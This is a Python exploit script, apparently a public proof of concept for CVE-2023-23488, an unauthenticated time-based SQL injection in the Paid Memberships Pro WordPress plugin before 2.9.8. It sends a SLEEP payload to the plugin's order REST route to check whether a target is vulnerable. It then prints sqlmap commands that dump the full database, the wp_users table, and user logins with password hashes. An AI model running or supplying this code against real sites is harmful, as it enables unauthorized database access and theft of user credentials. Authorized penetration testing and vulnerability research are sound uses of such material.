import sys
import requests

def get_request(target_url, delay="1"):
    payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(" + delay + ")))a)-- -"
    data = {'rest_route': '/pmpro/v1/order',
            'code': payload}
    return requests.get(target_url, params=data).elapsed.total_seconds()

print('Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection\n')
if len(sys.argv) != 2:
    print('Usage: {} <target_url>'.format("python3 CVE-2023-23488.py"))
    print('Example: {} http://127.0.0.1/wordpress'.format("python3 CVE-2023-23488.py"))
    sys.exit(1)

target_url = sys.argv[1]
try:
    print('[-] Testing if the target is vulnerable...')
    req = requests.get(target_url, timeout=15)
except:
    print('{}[!] ERROR: Target is unreachable{}'.format(u'\033[91m',u'\033[0m'))
    sys.exit(2)

if get_request(target_url, "1") >= get_request(target_url, "2"):
    print('{}[!] The target does not seem vulnerable{}'.format(u'\033[91m',u'\033[0m'))
    sys.exit(3)
print('\n{}[*] The target is vulnerable{}'.format(u'\033[92m', u'\033[0m'))
print('\n[+] You can dump the whole WordPress database with:')
print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump'.format(target_url))
print('\n[+] To dump data from specific tables:')
print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users'.format(target_url))
print('\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):')
print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass'.format(target_url))
sys.exit(0)
            
